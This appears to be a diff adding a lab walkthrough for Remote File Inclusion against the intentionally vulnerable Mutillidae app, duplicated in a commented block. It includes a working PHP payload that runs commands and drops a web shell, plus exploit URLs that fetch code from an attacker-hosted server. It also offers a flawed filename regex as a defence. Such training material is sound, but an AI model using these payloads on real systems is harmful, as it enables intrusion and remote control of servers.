@@ -1,0 +1,182 @@
+Remote File Inclusion | RFI
+
+Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are 
+usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application. 
+
+-> Configure PHP on the Win 10 machine.
+You have to slightly lower the security level on the PHP in the Win10 machine.
+Open the file C:\XAMPP\PHP\php.ini then change or check:
+---
+allow_url_fopen=On
+...
+allow_url_include=On
+...
+extension=php_curl.dll
+...
+---
+
+-> Open the vulnerable Mutillidae site
+Mutillidae should be installed in the Win10 machine.
+On Kali, open http://<Win10 IP>/mutillidae.
+Put Security level at 0 (Hosed).
+
+-> Try an intrusion
+1. Choose on the left OWASP 2017 / A5 - Broken Access Control / Insecure Direct Object References / Text File Viewer
+    
+2. Try to view one file.
+  Click on "View file" and constate the file is displayed.
+
+3. Prepare the Kali machine.
+  Copy the file intrus.txt (see resources/intrus.txt) into Kali to /var/www/tml).
+  Start Apache2 (sudo systemctl start apache2).
+
+4. Inspect the code.
+  Right-click on the Text File Name Box to display code.
+  Into the first line, replace the URL by another remote file name (ie intrus.txt on Kali) then Enter and close the 
+    Inspect windows with [X].
+  See: resources/intrus.txt for more details.
+   >>> before: <option value="http://www.textfiles.com/hacking/auditool.txt">Intrusion ... (January 29, 1991)</option>
+   >>> after : <option value="http://<kali IP>/intrus.txt">Intrusion ... (January 29, 1991)</option>
+  Click on "View File".
+  >>> you should see a "Bonjour ! message.
+
+  Here is the intrus file with some examples (uncomment what you want to do):
+  ---
+  <?php
+    // Used to display error in this session.
+    ini_set('display_errors',1);
+    error_reporting(E_ALL);
+
+    // First example: just display a message.
+    echo "Bonjour :)";
+
+    // Second example: use passthru() to execute command.
+    //echo passthru("ipconfig.exe");
+
+    // Third example: create a PHP backdoor.
+    $fichier= fopen("C:\\xampp\\htdocs\\mutillidae\\backdoor.php", "w") or die ("oups");
+    $contenu = '<?php if(isset($_GET["commande"])) {echo system($_GET["commande"]);} ?>';
+    fwrite($fichier, $contenu);
+    fclose($fichier);
+  ?>
+  ---
+
+  Now, you can directly use the URL to execute the intrus.txt file: 
+    http://<win10 IP>/mutillidae/index.php?page=http://192.168.8.128/intrus.txt
+
+  Try the second example (ipconfig) by uncommenting the line with passthru().
+  >> you should see the ipconfig result.
+
+  Try the backdoor PHP by uncommenting the 4 lines.
+  >>> after opening the URL on Kali (http://<win10 IP>/mutillidae/index.php?page=http://192.168.8.128/intrus.txt), 
+      the backdoor file will be put on th Win10 machine into: C:\XAMPP\HTDOCS\MUTILLIDAE\
+
+  Execute a commande on Win10 using the backdoor:
+  Just open the URL on Kali: http://<win10 IP>/mutillidae/backdoor.php?commande=ipconfig.exe
+  >>> the command ipconfig was executed through the installed backdoor.
+  
+-> Prevent include vulnerabilities
+Here are some advice:
+  1. Modify the PHP.ini file
+     Put allow_url_fopen to Off. Whether to allow the treatment of URLs (like http:// or ftp://) as files.
+     Put allow_url_include to Off. Whether to allow include/require to open URLs (like https:// or ftp://) as files.
+  2. Use the PHP preg_match() function that checks the name of the file to open.
+     Example: $lPageIsAllowed = (preg_match("/^[a-zA-Z0-9\.\-\/]+[\.php|\.html]$/", $lPage) == 1);
+  3. Use switch() function to prevent non intended file to be executed or loaded.
+
+>@
+>@#############################################################################################################################
+>@#                                                                                                                           #
+>@# [ Remote File Inclusion | RFI ]                                                                                           #                                                                                    
+>@#                                                                                                                           #
+>@# Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are  #
+>@# usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.                   #
+>@#                                                                                                                           #
+>@# See: howto-1075-owasp-top-10.txt                                                                                          #
+>@# See: howto-1076-owasp-top-10-fr.tx                                                                                        #
+>@#                                                                                                                           #
+>@#---------------------------------------------------------------------------------------------------------------------------#
+>@
+>@-> Configure PHP on the Win 10 machine.
+>@You have to slightly lower the security level on the PHP in the Win10 machine.
+>@Open the file C:\XAMPP\PHP\php.ini then change or check:
+>@---
+>@allow_url_fopen=On
+>@...
+>@allow_url_include=On
+>@...
+>@extension=php_curl.dll
+>@...
+>@---
+>@
+>@-> Open the vulnerable Mutillidae site
+>@Mutillidae should be installed in the Win10 machine.
+>@On Kali, open http://<Win10 IP>/mutillidae.
+>@Put Security level at 0 (Hosed).
+>@
+>@-> Try an intrusion
+>@1. Choose on the left OWASP 2017 / A5 - Broken Access Control / Insecure Direct Object References / Text File Viewer
+>@    
+>@2. Try to view one file.
+>@  Click on "View file" and constate the file is displayed.
+>@
+>@3. Prepare the Kali machine.
+>@  Copy the file intrus.txt (see resources/intrus.txt) into Kali to /var/www/tml).
+>@  Start Apache2 (sudo systemctl start apache2).
+>@
+>@4. Inspect the code.
+>@  Right-click on the Text File Name Box to display code.
+>@  Into the first line, replace the URL by another remote file name (ie intrus.txt on Kali) then Enter and close the 
+>@    Inspect windows with [X].
+>@  See: resources/intrus.txt for more details.
+>@   >>> before: <option value="http://www.textfiles.com/hacking/auditool.txt">Intrusion ... (January 29, 1991)</option>
+>@   >>> after : <option value="http://<kali IP>/intrus.txt">Intrusion ... (January 29, 1991)</option>
+>@  Click on "View File".
+>@  >>> you should see a "Bonjour ! message.
+>@
+>@  Here is the intrus file with some examples (uncomment what you want to do):
+>@  ---
+>@  <?php
+>@    // Used to display error in this session.
+>@    ini_set('display_errors',1);
+>@    error_reporting(E_ALL);
+>@
+>@    // First example: just display a message.
+>@    echo "Bonjour :)";
+>@
+>@    // Second example: use passthru() to execute command.
+>@    //echo passthru("ipconfig.exe");
+>@
+>@    // Third example: create a PHP backdoor.
+>@    $fichier= fopen("C:\\xampp\\htdocs\\mutillidae\\backdoor.php", "w") or die ("oups");
+>@    $contenu = '<?php if(isset($_GET["commande"])) {echo system($_GET["commande"]);} ?>';
+>@    fwrite($fichier, $contenu);
+>@    fclose($fichier);
+>@  ?>
+>@  ---
+>@
+>@  Now, you can directly use the URL to execute the intrus.txt file: 
+>@    http://<win10 IP>/mutillidae/index.php?page=http://192.168.8.128/intrus.txt
+>@
+>@  Try the second example (ipconfig) by uncommenting the line with passthru().
+>@  >> you should see the ipconfig result.
+>@
+>@  Try the backdoor PHP by uncommenting the 4 lines.
+>@  >>> after opening the URL on Kali (http://<win10 IP>/mutillidae/index.php?page=http://192.168.8.128/intrus.txt), 
+>@      the backdoor file will be put on th Win10 machine into: C:\XAMPP\HTDOCS\MUTILLIDAE\
+>@
+>@  Execute a commande on Win10 using the backdoor:
+>@  Just open the URL on Kali: http://<win10 IP>/mutillidae/backdoor.php?commande=ipconfig.exe
+>@  >>> the command ipconfig was executed thru the installed backdoor.
+>@
+>@-> Prevent include vulnerabilities
+>@Here are some advice:
+>@  1. Modify the PHP.ini file
+>@     Put allow_url_fopen to Off. Whether to allow the treatment of URLs (like http:// or ftp://) as files.
+>@     Put allow_url_include to Off. Whether to allow include/require to open URLs (like https:// or ftp://) as files.
+>@  2. Use the PHP preg_match() function that checks the name of the file to open.
+>@     Example: $lPageIsAllowed = (preg_match("/^[a-zA-Z0-9\.\-\/]+[\.php|\.html]$/", $lPage) == 1);
+>@  3. Use switch() function to prevent non intended file to be executed or loaded.
+>@
+>@#############################################################################################################################
+>@
